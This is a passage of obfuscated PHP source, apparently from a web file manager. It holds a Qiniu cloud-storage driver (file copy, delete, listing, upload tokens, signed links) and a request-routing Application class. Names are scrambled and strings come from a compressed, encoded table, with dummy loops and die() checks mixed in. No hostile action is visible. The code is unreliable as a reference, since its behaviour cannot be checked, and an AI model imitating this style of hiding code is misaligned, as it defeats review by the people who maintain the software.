public function copyFile($‡‹ğºµ, $ù„‹¾±©) { $ ™âÇ›— = $this->bucketManager->copy($this->bucket, $‡‹ğºµ, $this->bucket, $ù„‹¾±©, !0); return $ ™âÇ›— ? !1 : $this->getPathOuter($ù„‹¾±©); } public function moveFile($Ô¤Ä‘±Ê, $ñ×ºà¤±) { $Çó¾©³Ñ = $this->bucketManager->move($this->bucket, $Ô¤Ä‘±Ê, $this->bucket, $ñ×ºà¤±, !0); return $Çó¾©³Ñ ? !1 : $this->getPathOuter($ñ×ºà¤±); } public function delFile($¯Ö¾ˆ) { if (!$this->exist($¯Ö¾ˆ)) { return !0; } $ÉÛ’ÚŸ = $this->bucketManager->delete($this->bucket, $¯Ö¾ˆ); return $ÉÛ’ÚŸ ? !1 : !0; } public function delFolder($Î¨‘™¾) { $Á¿‘ÉõÜ =& $_SERVER[­á Ş³Ö]; if (!$this->exist($Î¨‘™¾)) { return !0; } $this->listItemCache = !1; $ ”÷÷ß = $this->fileList($Î¨‘™¾); $this->listItemCache = !0; $ÑàäíåË = trim($Î¨‘™¾, $Á¿‘ÉõÜ[8]) . $Á¿‘ÉõÜ[8]; if (!empty($Î¨‘™¾) && $Î¨‘™¾ !== $Á¿‘ÉõÜ[198] && !in_array($ÑàäíåË, $ ”÷÷ß[$Á¿‘ÉõÜ[82]])) { $ ”÷÷ß[$Á¿‘ÉõÜ[82]][] = $ÑàäíåË; } $è‹¤’ŸÄ = $this->delByBatch($ ”÷÷ß[$Á¿‘ÉõÜ[83]]); if (!$è‹¤’ŸÄ) { return !1; } $è‹¤’ŸÄ = $this->delByBatch($ ”÷÷ß[$Á¿‘ÉõÜ[82]]); if (!$è‹¤’ŸÄ) { return !1; } return $this->delFile($ÑàäíåË); } private function delByBatch($º‚†‡¿) { foreach (array_chunk($º‚†‡¿, 1000) as $‡Ë®Èşß) { $¹Àß¾Æ = $this->bucketManager->buildBatchDelete($this->bucket, $‡Ë®Èşß); list($Šáª’¤â, $áıèÁÚÛ) = $this->bucketManager->batch($¹Àß¾Æ); if ($áıèÁÚÛ) { return !1; } } return !0; } public function rename($âü‹ò«â, $Èó¯ÓÕù) { return $this->renameObject($âü‹ò«â, $Èó¯ÓÕù); } public function fileInfo($ö¬ëşˆ, $ğ¯ÑÍ‘’ = false, $¬’Úƒ£œ = array()) { $İŠ…½Ÿ¿ =& $_SERVER[­á Ş³Ö]; $€Ä–¥©¤ = array($İŠ…½Ÿ¿[32] => $this->pathThis($ö¬ëşˆ), $İŠ…½Ÿ¿[84] => $this->getPathOuter($İŠ…½Ÿ¿[8] . $ö¬ëşˆ), $İŠ…½Ÿ¿[33] => $İŠ…½Ÿ¿[200], $İŠ…½Ÿ¿[76] => isset($¬’Úƒ£œ[$İŠ…½Ÿ¿[1435]]) ? $¬’Úƒ£œ[$İŠ…½Ÿ¿[1435]] : 0, $İŠ…½Ÿ¿[174] => $this->ext($ö¬ëşˆ)); if ($ğ¯ÑÍ‘’) { return $€Ä–¥©¤; } $€Ä–¥©¤[$İŠ…½Ÿ¿[201]] = $€Ä–¥©¤[$İŠ…½Ÿ¿[85]] = 0; $€Ä–¥©¤[$İŠ…½Ÿ¿[202]] = $€Ä–¥©¤[$İŠ…½Ÿ¿[203]] = !0; if (empty($¬’Úƒ£œ)) { $¬’Úƒ£œ = $this->objectMeta($ö¬ëşˆ); if (!$¬’Úƒ£œ) { return $€Ä–¥©¤; } } if (isset($¬’Úƒ£œ[$İŠ…½Ÿ¿[1436]])) { $€Ä–¥©¤[$İŠ…½Ÿ¿[85]] = substr($¬’Úƒ£œ[$İŠ…½Ÿ¿[1436]] . $İŠ…½Ÿ¿[12], 0, 10); } if (isset($¬’Úƒ£œ[$İŠ…½Ÿ¿[1435]])) { $€Ä–¥©¤[$İŠ…½Ÿ¿[76]] = $¬’Úƒ£œ[$İŠ…½Ÿ¿[1435]]; } return $€Ä–¥©¤; } public function folderInfo($èÖ‘º, $ùË“Ê¬³ = false) { $ÆËá˜‰õ =& $_SERVER[­á Ş³Ö]; $Â‰ºõÈß = array($ÆËá˜‰õ[32] => $this->pathThis($èÖ‘º), $ÆËá˜‰õ[84] => $this->getPathOuter($ÆËá˜‰õ[8] . $èÖ‘º), $ÆËá˜‰õ[33] => $ÆËá˜‰õ[75]); if ($ùË“Ê¬³) { return $Â‰ºõÈß; } $Â‰ºõÈß[$ÆËá˜‰õ[201]] = $Â‰ºõÈß[$ÆËá˜‰õ[85]] = 0; $Â‰ºõÈß[$ÆËá˜‰õ[202]] = $Â‰ºõÈß[$ÆËá˜‰õ[203]] = !0; $èÖ‘º = rtrim($èÖ‘º, $ÆËá˜‰õ[8]) . $ÆËá˜‰õ[8]; $ê×Çñ¤¤ = $this->objectMeta($èÖ‘º); if (isset($ê×Çñ¤¤[$ÆËá˜‰õ[1436]])) { $Â‰ºõÈß[$ÆËá˜‰õ[85]] = substr($ê×Çñ¤¤[$ÆËá˜‰õ[1436]] . $ÆËá˜‰õ[12], 0, 10); } return $Â‰ºõÈß; } public function listPath($ ËÁÌ«ğ, $ÓÙÜ¨Ÿ = false) { $ŒÊ¼ş¹ =& $_SERVER[­á Ş³Ö]; $¿¼—Ä€Ï = $this->fileList($ ËÁÌ«ğ, $ŒÊ¼ş¹[8], !0); foreach ($¿¼—Ä€Ï[$ŒÊ¼ş¹[82]] as $»ÌÃµ«Ò => $Èõú¢°) { $¿¼—Ä€Ï[$ŒÊ¼ş¹[82]][$»ÌÃµ«Ò] = $this->folderInfo($Èõú¢°, $ÓÙÜ¨Ÿ); } foreach ($¿¼—Ä€Ï[$ŒÊ¼ş¹[83]] as $»ÌÃµ«Ò => $Èõú¢°) { $¿¼—Ä€Ï[$ŒÊ¼ş¹[83]][$»ÌÃµ«Ò] = $this->fileInfo($Èõú¢°[$ŒÊ¼ş¹[94]], $ÓÙÜ¨Ÿ, $Èõú¢°); } return $¿¼—Ä€Ï; } public function has($éßÒÁ§Ò, $“Šøä = false, $ÙÚàµôº = true) { $–«¾ç®¥ =& $_SERVER[­á Ş³Ö]; $éßÒÁ§Ò = trim($éßÒÁ§Ò, $–«¾ç®¥[8]); $§¼®Ñ¡¹ = empty($éßÒÁ§Ò) && $éßÒÁ§Ò !== $–«¾ç®¥[198] ? $–«¾ç®¥[12] : $éßÒÁ§Ò . $–«¾ç®¥[8]; $şˆ°Àèå = $–«¾ç®¥[12]; $¶Ÿç¨³Î = 500; $Ù‰††Ç« = $–«¾ç®¥[8]; $õâÂÃÈù = $ˆ½×Ãõå = 0; while (!0) { check_abort(); list($ÉÖúĞ˜Ö, $…×’Ö¿) = $this->bucketManager->listFiles($this->bucket, $§¼®Ñ¡¹, $şˆ°Àèå, $¶Ÿç¨³Î, $Ù‰††Ç«); if ($…×’Ö¿) { break; } $şˆ°Àèå = array_key_exists($–«¾ç®¥[1404], $ÉÖúĞ˜Ö) ? $şˆ°Àèå = $ÉÖúĞ˜Ö[$–«¾ç®¥[1437]] : $–«¾ç®¥[12]; if ($“Šøä) { if (!empty($ÉÖúĞ˜Ö[$–«¾ç®¥[1438]])) { $õâÂÃÈù += count($ÉÖúĞ˜Ö[$–«¾ç®¥[1438]]); } if (!empty($ÉÖúĞ˜Ö[$–«¾ç®¥[1439]])) { $ˆ½×Ãõå += count($ÉÖúĞ˜Ö[$–«¾ç®¥[1439]]); } if ($şˆ°Àèå === $–«¾ç®¥[12]) { break; } continue; } if ($ÙÚàµôº) { if (!empty($ÉÖúĞ˜Ö[$–«¾ç®¥[1438]])) { return !0; } } else { if (!empty($ÉÖúĞ˜Ö[$–«¾ç®¥[1439]])) { return !0; } } if ($şˆ°Àèå === $–«¾ç®¥[12]) { break; } } if ($“Šøä) { return array($–«¾ç®¥[207] => $õâÂÃÈù, $–«¾ç®¥[208] => $ˆ½×Ãõå); } return !1; } public function listAll($¯†º†ú) { $´­Æ¼ˆı =& $_SERVER[­á Ş³Ö]; $¦„Åˆ÷Ü = $this->fileList($¯†º†ú, $´­Æ¼ˆı[12], !0); $”Ã‘ëâï = array_to_keyvalue($¦„Åˆ÷Ü[$´­Æ¼ˆı[83]], $´­Æ¼ˆı[32]); foreach ($¦„Åˆ÷Ü[$´­Æ¼ˆı[82]] as $Ñ‹„û´) { if (is_string($Ñ‹„û´)) { $”Ã‘ëâï[$Ñ‹„û´] = array($´­Æ¼ˆı[76] => 0); } } return $this->listAllFiles($¯†º†ú, $”Ã‘ëâï); } private function fileList($†’Š½ö, $Ï—Ã©”ó = '', $ÆÇÀÚĞ = 0) { $ğ½™–§® =& $_SERVER[­á Ş³Ö]; $†’Š½ö = trim($†’Š½ö, $ğ½™–§®[8]); $™Ì¾­ªŒ = empty($†’Š½ö) && $†’Š½ö !== $ğ½™–§®[198] ? $ğ½™–§®[12] : $†’Š½ö . $ğ½™–§®[8]; $§öŒÖâ™ = $ğ½™–§®[12]; $Ê˜½µÜå = 1000; $›Ö°Ÿ‡Ş = $Äå“ó›ß = array(); while (!0) { check_abort(); list($êŠæïÂ½, $øàÊ£•¿) = $this->bucketManager->listFiles($this->bucket, $™Ì¾­ªŒ, $§öŒÖâ™, $Ê˜½µÜå, $Ï—Ã©”ó); if ($øàÊ£•¿) { break; } $§öŒÖâ™ = array_key_exists($ğ½™–§®[1404], $êŠæïÂ½) ? $§öŒÖâ™ = $êŠæïÂ½[$ğ½™–§®[1437]] : $ğ½™–§®[12]; $·ƒÏÅ©ñ = isset($êŠæïÂ½[$ğ½™–§®[1438]]) ? $êŠæïÂ½[$ğ½™–§®[1438]] : array(); $œ•¾àÇ¸ = isset($êŠæïÂ½[$ğ½™–§®[1439]]) ? $êŠæïÂ½[$ğ½™–§®[1439]] : array(); foreach ($·ƒÏÅ©ñ as $÷›Çó”©) { if ($÷›Çó”©[$ğ½™–§®[94]] == $™Ì¾­ªŒ) { continue; } $½û¦ûâù = $÷›Çó”©[$ğ½™–§®[94]]; $ŸŞ–Ê = $÷›Çó”©[$ğ½™–§®[1435]]; $÷›Çó”©[$ğ½™–§®[76]] = $ŸŞ–Ê; $ïèÛ’‹„ = $ŸŞ–Ê == 0 && substr($½û¦ûâù, strlen($½û¦ûâù) - 1, 1) == $ğ½™–§®[8] ? !0 : !1; $this->cacheMethodInfoSet($½û¦ûâù, $ïèÛ’‹„, $÷›Çó”©); if ($ïèÛ’‹„) { $›Ö°Ÿ‡Ş[] = $½û¦ûâù; continue; } $Äå“ó›ß[] = $ÆÇÀÚĞ ? $÷›Çó”© : $½û¦ûâù; } foreach ($œ•¾àÇ¸ as $½û¦ûâù) { if ($½û¦ûâù == $™Ì¾­ªŒ) { continue; } $›Ö°Ÿ‡Ş[] = $½û¦ûâù; $this->cacheMethodInfoSet($½û¦ûâù, !0); } if ($§öŒÖâ™ === $ğ½™–§®[12]) { break; } } $this->cacheMethodInfoSet($†’Š½ö, !0); return array($ğ½™–§®[82] => $›Ö°Ÿ‡Ş, $ğ½™–§®[83] => $Äå“ó›ß); } public function canRead($ÓÄê‹İ) { return $this->exist($ÓÄê‹İ) ? !0 : !1; } public function canWrite($ä©«ìõİ) { return $this->exist($ä©«ìõİ) ? !0 : !1; } public function getContent($¡¶Ü¼òÍ) { return $this->fileSubstr($¡¶Ü¼òÍ, 0, -1); } public function setContent($Ã ˆ¾ö†, $‘¾§µ‹ = '') { $ˆ–û¼³Ø = $this->tempFile($this->pathThis($Ã ˆ¾ö†)); file_put_contents($ˆ–û¼³Ø, $‘¾§µ‹); if ($this->upload($Ã ˆ¾ö†, $ˆ–û¼³Ø)) { $this->tempFileRemve($ˆ–û¼³Ø); return !0; } return !1; } public function refreshUrls($…ôËœ¸ë) { $ú»ö²­ =& $_SERVER[­á Ş³Ö]; $­ÃÒÈíÓ = array(); if (is_array($…ôËœ¸ë)) { foreach ($…ôËœ¸ë as $Ûş³ÃÛ“) { $­ÃÒÈíÓ[] = $this->link($Ûş³ÃÛ“); } } else { $­ÃÒÈíÓ[] = $this->link($…ôËœ¸ë); } $ÖñÑ¶İª = new Qiniu\Cdn\CdnManager($this->auth); list($Ø°şŠï´, $‰èı¥¿) = $ÖñÑ¶İª->refreshUrls($­ÃÒÈíÓ); if ($‰èı¥¿) { return !1; } return $Ø°şŠï´[$ú»ö²­[1178]] == $ú»ö²­[756] ? !0 : !1; } public function fileSubstr($ßéáÏÚ, $³ÁßÚŞë, $À¼Ï“Šª) { $›Ò˜ñ¸é =& $_SERVER[­á Ş³Ö]; if (!($îŞìë‰ = $this->link($ßéáÏÚ))) { return !1; } $äş«º‰Š = !1; if ($À¼Ï“Šª > 0) { $…•ÀÊŒ = $³ÁßÚŞë + $À¼Ï“Šª - 1; $äş«º‰Š = array($›Ò˜ñ¸é[1440] . $³ÁßÚŞë . $›Ò˜ñ¸é[386] . $…•ÀÊŒ); } $Ã¥ƒÎù = url_request($îŞìë‰, $›Ò˜ñ¸é[230], !1, $äş«º‰Š); return $Ã¥ƒÎù[$›Ò˜ñ¸é[746]] ? $Ã¥ƒÎù[$›Ò˜ñ¸é[1198]] : !1; } public function upload($Ää±æ, $æáåŸ¤, $¼²‹üöË = false, $¡¶ş¿Ï´ = REPEAT_REPLACE) { $ó“ßñ£ = new Qiniu\Storage\UploadManager(); $ÒÒ¾öø = $this->auth->uploadToken($this->bucket, $Ää±æ); $Ó–¹Ì¼ı = get_file_mime(get_path_ext($æáåŸ¤)); list($¾„µúÙÛ, $£á•¯”Õ) = $ó“ßñ£->putFile($ÒÒ¾öø, $Ää±æ, $æáåŸ¤, null, $Ó–¹Ì¼ı); return $£á•¯”Õ ? !1 : $this->getPathOuter($Ää±æ); } public function uploadFormData($õô¿ªÚ€, $Ö¡®Ú™Ş = 3600) { return $this->uploadToken($õô¿ªÚ€, $Ö¡®Ú™Ş); } public function multiUploadFormData($¢àô½×™, $½Šˆ”Ş½ = 3600) { return $this->uploadToken($¢àô½×™, $½Šˆ”Ş½); } private function uploadToken($İ¯Š…§Ç, $ÖÏşŒ«½ = 3600) { $×È–Í =& $_SERVER[­á Ş³Ö]; $ğªø³¡ø = $ÖÏşŒ«½; $²àØÚÎß = array($×È–Í[1441] => $×È–Í[1442]); $àŒâ©Š = $İ¯Š…§Ç; $†ÊÌ”· = $this->auth->uploadToken($this->bucket, $àŒâ©Š, $ğªø³¡ø, $²àØÚÎß, !0); $Ó‚œš‘Á = empty($this->region) || $this->region == $×È–Í[1443] ? $×È–Í[12] : $×È–Í[386] . $this->region; $š¥ü§¾ = http_type() . "\72\x2f\x2f\165\x70\x6c\157\x61\x64{$Ó‚œš‘Á}\x2e\161\x69\x6e\151\165\x70\x2e\x63\157\155\x2f"; return array($×È–Í[1444] => $†ÊÌ”·, $×È–Í[1445] => $š¥ü§¾); } public function download($»Œ§ÔàÆ, $ƒİ’û) { $ÀÂúÔúÄ = IO::getPathInner(IO::mkfile($ƒİ’û)); if (!($ª—ì—ƒ = $this->link($»Œ§ÔàÆ))) { return !1; } $½²‹‰ ú = 0; $ºÆÚ´Ïä = 1024 * 200; $¶ÙÑÔ³ü = fopen($ÀÂúÔúÄ, $_SERVER[­á Ş³Ö][1446]); while (!0) { $ĞÈàƒóí = $this->fileSubstr($»Œ§ÔàÆ, $½²‹‰ ú, $ºÆÚ´Ïä); if ($ĞÈàƒóí === !1) { return !1; } fwrite($¶ÙÑÔ³ü, $ĞÈàƒóí); $½²‹‰ ú += $ºÆÚ´Ïä; if (strlen($ĞÈàƒóí) < $ºÆÚ´Ïä) { break; } } fclose($¶ÙÑÔ³ü); return $ƒİ’û; } public function link($×ƒ÷Ç‡á, $ë‡§»–Å = '') { if (!$this->isFile($×ƒ÷Ç‡á)) { return !1; } $ëñ ©œ = $this->getHost() . $_SERVER[­á Ş³Ö][8] . $this->pathEncode($×ƒ÷Ç‡á) . $ë‡§»–Å; return $this->auth->privateDownloadUrl($ëñ ©œ, 3600 * 12); } public function fileOut($ˆòÔÈ÷Ë, $ŒºÉí•Æ = false, $¾š½ÓŞ = false, $øöóï¶§ = '') { $½ıå‰ÜÄ =& $_SERVER[­á Ş³Ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($ˆòÔÈ÷Ë, $ŒºÉí•Æ, $¾š½ÓŞ, $øöóï¶§); } if (!$¾š½ÓŞ) { $¾š½ÓŞ = $this->pathThis($ˆòÔÈ÷Ë); } $Š£Ö³› = $ŒºÉí•Æ ? $½ıå‰ÜÄ[1447] . rawurlencode($¾š½ÓŞ) : $½ıå‰ÜÄ[12]; $«ƒ™Ò’Ÿ = $this->link($ˆòÔÈ÷Ë, $Š£Ö³›); $this->fileOutLink($«ƒ™Ò’Ÿ); } public function fileOutServer($­¢˜Ü£, $“˜úÑÒ£ = false, $Æ˜å‰¾¦ = false, $øµÃÚ² = '') { parent::fileOut($­¢˜Ü£, $“˜úÑÒ£, $Æ˜å‰¾¦, $øµÃÚ²); } public function fileOutImage($ûÙ¥–é¬, $–à–ıºŒ = 250) { $è“Åî£ = $this->link($ûÙ¥–é¬, $_SERVER[­á Ş³Ö][1448] . $–à–ıºŒ); $this->fileOutLink($è“Åî£); } public function fileOutImageServer($¶¸¦˜º‡, $ÅŞÅÒ× = 250) { parent::fileOutImage($¶¸¦˜º‡, $ÅŞÅÒ×); } public function hashMd5($á²’”å) { $ı÷× ¹ =& $_SERVER[­á Ş³Ö]; $şòÇÉ™ä = $this->objectMeta($á²’”å); return isset($şòÇÉ™ä[$ı÷× ¹[212]]) ? $şòÇÉ™ä[$ı÷× ¹[212]] : !1; $¬ÜÌ¿ñÕ = $this->link($á²’”å, $ı÷× ¹[1449]); } public function size($™³ãå‹) { $×òáÃ±÷ = $this->objectMeta($™³ãå‹); return $×òáÃ±÷ ? $×òáÃ±÷[$_SERVER[­á Ş³Ö][76]] : 0; } public function info($«Ù½§¸¢) { if ($this->isFolder($«Ù½§¸¢)) { return $this->folderInfo($«Ù½§¸¢); } else { if ($this->isFile($«Ù½§¸¢)) { return $this->fileInfo($«Ù½§¸¢); } } return !1; } public function exist($ıÌÖ÷Ê§) { return $this->isFile($ıÌÖ÷Ê§) || $this->isFolder($ıÌÖ÷Ê§); } public function isFile($ŠÄşù½ƒ) { return !$this->isFolder($ŠÄşù½ƒ) && $this->objectMeta($ŠÄşù½ƒ); } public function isFolder($¸¹ûÖÕ—) { return $this->cacheMethod($_SERVER[­á Ş³Ö][165], $¸¹ûÖÕ—); } protected function objectMeta($ĞÚáæ) { return $this->cacheMethod($_SERVER[­á Ş³Ö][167], $ĞÚáæ); } protected function _objectMeta($€Û˜©æé) { $Ş´á¡òş =& $_SERVER[­á Ş³Ö]; list($¸Î”ºĞº, $Â´Ãè„) = $this->bucketManager->stat($this->bucket, $€Û˜©æé); if ($¸Î”ºĞº) { $¸Î”ºĞº[$Ş´á¡òş[76]] = intval($¸Î”ºĞº[$Ş´á¡òş[1435]]); } return $¸Î”ºĞº; } protected function _isFolder($—û¬¿ƒ—) { $ë©­Ø´ˆ =& $_SERVER[­á Ş³Ö]; if ($—û¬¿ƒ— == $ë©­Ø´ˆ[12] || $—û¬¿ƒ— == $ë©­Ø´ˆ[8]) { return !0; } list($‹Åü‡´ø, $ÀêÌ¬»¿) = $this->bucketManager->listFiles($this->bucket, trim($—û¬¿ƒ—, $ë©­Ø´ˆ[8]) . $ë©­Ø´ˆ[8], $ë©­Ø´ˆ[12], 1, $ë©­Ø´ˆ[8]); return !empty($‹Åü‡´ø[$ë©­Ø´ˆ[1438]]) || !empty($‹Åü‡´ø[$ë©­Ø´ˆ[1439]]) ? !0 : !1; } } goto cà„ÁÎ²Ş; CÀÍ‘É¶æ: define($_SERVER[­á Ş³Ö][604], $_SERVER[­á Ş³Ö][605]); $qdpncvohij = $_SERVER[­á Ş³Ö][606]; while ($qdpncvohij < $_SERVER[­á Ş³Ö][607]) { if ($qdpncvohij >= 0) { break; } $qdpncvohij++; } goto AÁß‡²Ó; AÁß‡²Ó: $_SERVER[ÕãïÎÍÅ] = explode($_SERVER[­á Ş³Ö][608], gzinflate(substr($_SERVER[­á Ş³Ö][609], 10, -8))); $xgctunizwb = $_SERVER[­á Ş³Ö][610]; class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\x6e\144\145\170"; function __construct() { } public function setDefault($‚Çí…û¿) { $üÙÍîƒí =& $_SERVER[­á Ş³Ö]; $Â·–„×÷ =& $_SERVER[ÕãïÎÍÅ]; $¼Ë« ¤ = explode($Â·–„×÷[0], trim($‚Çí…û¿, $Â·–„×÷[0])); $´ù¹«Ô = $üÙÍîƒí[611]; if (!$´ù¹«Ô) { die; } $this->defaultModule = $¼Ë« ¤[0] ? $¼Ë« ¤[0] : $this->defaultModule; $this->defaultController = $¼Ë« ¤[1] ? $¼Ë« ¤[1] : $this->defaultController; $this->defaultAction = $¼Ë« ¤[2] ? $¼Ë« ¤[2] : $this->defaultAction; $¤™«¬² = $üÙÍîƒí[612]; if (!$¤™«¬²) { return; } $this->pdgzc6fe193e($Â·–„×÷[1], array($this, $Â·–„×÷[2])); } public function appRun($ÔæµÊÓß) { $ºåß…ˆ² =& $_SERVER[­á Ş³Ö]; $ÇÀ¾ÈõÔ =& $_SERVER[ÕãïÎÍÅ]; $ã°‘ ¶ = explode($ÇÀ¾ÈõÔ[0], $ÔæµÊÓß); $¢‘’û´º = strtolower($ã°‘ ¶[0]); $‚³øñ³Ğ = $ÇÀ¾ÈõÔ[3]; if ($¢‘’û´º == $ÇÀ¾ÈõÔ[4]) { $‚³øñ³Ğ = $ÇÀ¾ÈõÔ[5]; $ã°‘ ¶[0] = $ÇÀ¾ÈõÔ[6]; $ã°‘ ¶[1] = $ã°‘ ¶[1] . $ÇÀ¾ÈõÔ[7]; $ÔæµÊÓß = join($ÇÀ¾ÈõÔ[0], $ã°‘ ¶); $ÔæµÊÓß = trim($ÔæµÊÓß, $ÇÀ¾ÈõÔ[0]); } call_user_func(array($ÇÀ¾ÈõÔ[8], $ÇÀ¾ÈõÔ[9]), $‚³øñ³Ğ . $ÇÀ¾ÈõÔ[10], $ÔæµÊÓß); ActionCall($ÔæµÊÓß); call_user_func(array($ÇÀ¾ÈõÔ[8], $ÇÀ¾ÈõÔ[9]), $‚³øñ³Ğ . $ÇÀ¾ÈõÔ[11], $ÔæµÊÓß); $ËÇÅ×¼ = $ºåß…ˆ²[613]; while ($ËÇÅ×¼ < $ºåß…ˆ²[614]) { if ($ËÇÅ×¼ >= 0) { break; } $ËÇÅ×¼++; } } private function autorun() { $§ËùÄˆ =& $_SERVER[ÕãïÎÍÅ]; global $config; if (count($config[$§ËùÄˆ[12]]) == 0) { return; } foreach ($config[$§ËùÄˆ[12]] as $–Øù›á => $¡¨‘˜ÔÎ) { $this->appRun($¡¨‘˜ÔÎ); } } private function klhj27b2b152() { $Õ¸†‰îİ =& $_SERVER[­á Ş³Ö]; $üãÜĞÆ =& $_SERVER[ÕãïÎÍÅ]; $Óıø¤• = $üãÜĞÆ[4]; $ÂÁÕÚàâ = $Õ¸†‰îİ[615]; $ª°‚Ä°ù = $GLOBALS[$üãÜĞÆ[13]][$üãÜĞÆ[14]][0]; if (!$ª°‚Ä°ù || strlen($ª°‚Ä°ù) <= strlen($Óıø¤•)) { return; } if (strtolower(substr($ª°‚Ä°ù, -strlen($Óıø¤•))) != $Óıø¤•) { return; } $š‘ğá÷ğ = substr($ª°‚Ä°ù, 0, -strlen($Óıø¤•)); $¼Í‰Ú¶å = array($üãÜĞÆ[4], $š‘ğá÷ğ); $‚â‰‰¤– = array_slice($GLOBALS[$üãÜĞÆ[13]][$üãÜĞÆ[14]], 1); $¼èÒİîñ = $Õ¸†‰îİ[616]; while ($¼èÒİîñ < $Õ¸†‰îİ[617]) { if ($¼èÒİîñ >= 0) { break; } $¼èÒİîñ++; } $GLOBALS[$üãÜĞÆ[13]][$üãÜĞÆ[14]] = array_merge($¼Í‰Ú¶å, $‚â‰‰¤–); $°› ì´™ = $Õ¸†‰îİ[618]; $GLOBALS[$üãÜĞÆ[13]][$üãÜĞÆ[15]] = implode($üãÜĞÆ[0], $GLOBALS[$üãÜĞÆ[13]][$üãÜĞÆ[14]]); $›¹ã£Ğ = $Õ¸†‰îİ[619]; if (strlen($›¹ã£Ğ) < $Õ¸†‰îİ[617]) { die; } } private function aseb5e3b7700() { $­€æĞª± =& $_SERVER[­á Ş³Ö]; $ôïôÑ =& $_SERVER[ÕãïÎÍÅ]; if ($GLOBALS[$ôïôÑ[13]][$ôïôÑ[15]] != $ôïôÑ[6]) { return; } $Ä®İ„š® = $_SERVER[$ôïôÑ[16]]; $¢ÛÖÍ›í = $­€æĞª±[620]; while ($¢ÛÖÍ›í < $­€æĞª±[617]) { if ($¢ÛÖÍ›í >= 0) { break; } $¢ÛÖÍ›í++; } $Ï‹°ó„æ = $ôïôÑ[17]; if (!strstr($Ä®İ„š®, $Ï‹°ó„æ)) { return; } $ Úè¼Öø = strrpos($Ä®İ„š®, $Ï‹°ó„æ); $êÔğììù = $­€æĞª±[621]; if (!$êÔğììù) { die; } $æ†ßöñ = substr($Ä®İ„š®, $ Úè¼Öø + strlen($Ï‹°ó„æ)); preg_match_all($ôïôÑ[18], $æ†ßöñ, $¾Ä¤½ãá); $æ†ßöñ = trim($¾Ä¤½ãá[0][0], $ôïôÑ[19]); $GLOBALS[$ôïôÑ[13]][$ôïôÑ[14]] = explode($ôïôÑ[19], $æ†ßöñ); $É”¥æÊâ = $­€æĞª±[622]; if (!$É”¥æÊâ) { die; } $GLOBALS[$ôïôÑ[13]][$ôïôÑ[15]] = implode($ôïôÑ[0], $GLOBALS[$ôïôÑ[13]][$ôïôÑ[14]]); } public function run() { $ô„÷ıá™ =& $_SERVER[­á Ş³Ö]; $Íôİí =& $_SERVER[ÕãïÎÍÅ]; $this->aseb5e3b7700(); $this->klhj27b2b152(); $—æçâÏ = $ô„÷ıá™[623]; while (strlen($—æçâÏ) < $ô„÷ıá™[624]) { if (!$—æçâÏ) { break; } $—æçâÏ++; } $Çú›óŠš = $GLOBALS[$Íôİí[13]][$Íôİí[14]]; $£Ô°İŞ = $ô„÷ıá™[625]; if (!$£Ô°İŞ) { return; } $ˆ€è¡ş = $GLOBALS[$Íôİí[13]][$Íôİí[15]]; $¥¤îäâ = $ô„÷ıá™[626]; while ($¥¤îäâ < $ô„÷ıá™[617]) { if ($¥¤îäâ >= 0) { break; } $¥¤îäâ++; } define($Íôİí[20], isset($Çú›óŠš[0]) && $Çú›óŠš[0] ? $Çú›óŠš[0] : $this->defaultModule); define($Íôİí[21], isset($Çú›óŠš[1]) && $Çú›óŠš[0] ? $Çú›óŠš[1] : $this->defaultController); define($Íôİí[22], isset($Çú›óŠš[2]) && $Çú›óŠš[0] ? $Çú›óŠš[2] : $this->defaultAction); define($Íôİí[23], MOD . $Íôİí[0] . ST . $Íôİí[0] . ACT); $_SERVER[$Íôİí[24]] = strtolower(ACTION); $¡…¶‰äÛ = $ô„÷ıá™[627]; $this->autorun(); if (count($Çú›óŠš) >= 3) { $this->appRun($ˆ€è¡ş); } else { $this->appRun(ACTION); } } private $idou357f796e = array(); private $xrgp672fde7b = ''; public function lfgm63f061c4() { $¼‚ƒ€¬‹ =& $_SERVER[­á Ş³Ö]; $Ö”“Ç«¥ =& $_SERVER[ÕãïÎÍÅ]; $this->jkay216ad9ac(); $„îğ“ëÖ = $¼‚ƒ€¬‹[626]; while ($„îğ“ëÖ < $¼‚ƒ€¬‹[628]) { if ($„îğ“ëÖ >= 0) { break; } $„îğ“ëÖ++; } $this->ctedaca5c5d0(); $this->aoej8c0ec12f(); $this->nirm89e73890(); $´ÄÆô‹ä = $¼‚ƒ€¬‹[629]; $this->nhzp4cfcc5cc(); $this->cnsbe6e5ff62(); $ç“–ŸÓ = $¼‚ƒ€¬‹[630]; if (strlen($ç“–ŸÓ) < $¼‚ƒ€¬‹[617]) { die; } $this->htrga442d9b4(); $¾¢¢ü›µ = $¼‚ƒ€¬‹[631]; while ($¾¢¢ü›µ < $¼‚ƒ€¬‹[607]) { if ($¾¢¢ü›µ >= 0) { break; } $¾¢¢ü›µ++; } $this->pdgzc6fe193e($Ö”“Ç«¥[25], array($this, $Ö”“Ç«¥[26])); $this->pdgzc6fe193e($Ö”“Ç«¥[27], array($this, $Ö”“Ç«¥[28])); $this->pdgzc6fe193e($Ö”“Ç«¥[29], array($this, $Ö”“Ç«¥[30])); $this->pdgzc6fe193e($Ö”“Ç«¥[31], array($this, $Ö”“Ç«¥[32])); } public function qfdbb4079ff7($³ìü³) { $«†—à—Ï =& $_SERVER[­á Ş³Ö]; $Á£÷ã =& $_SERVER[ÕãïÎÍÅ]; $¡èˆ§Á¶ = Model($Á£÷ã[33])->get(); $™½ŸˆÚ = $«†—à—Ï[632]; while ($™½ŸˆÚ < $«†—à—Ï[607]) { if ($™½ŸˆÚ >= 0) { break; } $™½ŸˆÚ++; } $›Öë«ŸÍ = array($Á£÷ã[34], $Á£÷ã[35], $Á£÷ã[36], $Á£÷ã[37], $Á£÷ã[38], $Á£÷ã[39], $Á£÷ã[40], $Á£÷ã[41], $Á£÷ã[42], $Á£÷ã[43], $Á£÷ã[44], $Á£÷ã[45], $Á£÷ã[46], $Á£÷ã[47], $Á£÷ã[48], $Á£÷ã[49], $Á£÷ã[50], $Á£÷ã[51], $Á£÷ã[52], $Á£÷ã[53], $Á£÷ã[54], $Á£÷ã[55], $Á£÷ã[56], $Á£÷ã[57], $Á£÷ã[58], $Á£÷ã[59], $Á£÷ã[60], $Á£÷ã[61], $Á£÷ã[62], $Á£÷ã[63], $Á£÷ã[64], $Á£÷ã[65], $Á£÷ã[66], $Á£÷ã[67], $Á£÷ã[68], $Á£÷ã[69], $Á£÷ã[70], $Á£÷ã[71], 